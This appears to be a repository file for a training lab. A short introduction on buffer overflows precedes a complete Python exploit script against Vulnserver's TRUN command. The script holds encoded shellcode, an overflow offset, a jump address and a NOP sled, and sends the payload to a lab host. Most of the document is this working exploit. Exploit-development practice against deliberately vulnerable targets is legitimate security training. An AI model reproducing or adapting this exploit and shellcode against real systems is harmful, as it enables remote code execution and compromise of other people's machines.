# Buffer-Overflow-Exploit-on-Vulnserver-Exploit-Development-using-TRUN-Command-
"""
Introduction
A buffer overflow is a software coding error which could be exploited by an attacker to gain access to the system. A buffer is a sequential portion of memory that is reserved to contain anything from a string to an array of integer characters. When more data is put into a fixed-length buffer than the buffer can handle, a buffer overflow happens. The extra information, which has to go somewhere, can overflow into adjacent memory space, corrupting or overwriting the data held in that space. This overflow usually results in a system crash, but it also provides the ability for an attacker to execute arbitrary code or exploit the coding errors to cause malicious acts. 
Demonstration Environment:
Oracle VirtualBox v 6.1.2
Kali Linux 2020.1
Windows Pro 7 32 bit
Immunity debugger v1.85 with Mona
Python v 2.7.1
Vulnserver
"""

#!/usr/bin/python


import socket
import sys
from time import sleep

shellcode = ("\xda\xcc\xba\x78\x98\x32\x6e\xd9\x74\x24\xf4\x5e\x33\xc9\xb1"
"\x52\x31\x56\x17\x83\xee\xfc\x03\x2e\x8b\xd0\x9b\x32\x43\x96"
"\x64\xca\x94\xf7\xed\x2f\xa5\x37\x89\x24\x96\x87\xd9\x68\x1b"
"\x63\x8f\x98\xa8\x01\x18\xaf\x19\xaf\x7e\x9e\x9a\x9c\x43\x81"
"\x18\xdf\x97\x61\x20\x10\xea\x60\x65\x4d\x07\x30\x3e\x19\xba"
"\xa4\x4b\x57\x07\x4f\x07\x79\x0f\xac\xd0\x78\x3e\x63\x6a\x23"
"\xe0\x82\xbf\x5f\xa9\x9c\xdc\x5a\x63\x17\x16\x10\x72\xf1\x66"
"\xd9\xd9\x3c\x47\x28\x23\x79\x60\xd3\x56\x73\x92\x6e\x61\x40"
"\xe8\xb4\xe4\x52\x4a\x3e\x5e\xbe\x6a\x93\x39\x35\x60\x58\x4d"
"\x11\x65\x5f\x82\x2a\x91\xd4\x25\xfc\x13\xae\x01\xd8\x78\x74"
"\x2b\x79\x25\xdb\x54\x99\x86\x84\xf0\xd2\x2b\xd0\x88\xb9\x23"
"\x15\xa1\x41\xb4\x31\xb2\x32\x86\x9e\x68\xdc\xaa\x57\xb7\x1b"
"\xcc\x4d\x0f\xb3\x33\x6e\x70\x9a\xf7\x3a\x20\xb4\xde\x42\xab"
"\x44\xde\x96\x7c\x14\x70\x49\x3d\xc4\x30\x39\xd5\x0e\xbf\x66"
"\xc5\x31\x15\x0f\x6c\xc8\xfe\xf0\xd9\xd2\xef\x98\x1b\xd2\x1e"
"\x05\x95\x34\x4a\xa5\xf3\xef\xe3\x5c\x5e\x7b\x95\xa1\x74\x06"
"\x95\x2a\x7b\xf7\x58\xdb\xf6\xeb\x0d\x2b\x4d\x51\x9b\x34\x7b"
"\xfd\x47\xa6\xe0\xfd\x0e\xdb\xbe\xaa\x47\x2d\xb7\x3e\x7a\x14"
"\x61\x5c\x87\xc0\x4a\xe4\x5c\x31\x54\xe5\x11\x0d\x72\xf5\xef"
"\x8e\x3e\xa1\xbf\xd8\xe8\x1f\x06\xb3\x5a\xc9\xd0\x68\x35\x9d"
"\xa5\x42\x86\xdb\xa9\x8e\x70\x03\x1b\x67\xc5\x3c\x94\xef\xc1"
"\x45\xc8\x8f\x2e\x9c\x48\xbf\x64\xbc\xf9\x28\x21\x55\xb8\x34"
"\xd2\x80\xff\x40\x51\x20\x80\xb6\x49\x41\x85\xf3\xcd\xba\xf7"
"\x6c\xb8\xbc\xa4\x8d\xe9")


exploit = "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 32 + shellcode
try:
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(('192.168.56.101',9999))

	s.send(('TRUN /.:/' + exploit))
	s.close()

except:
	print "Error connecting to the server"
	sys.exit()
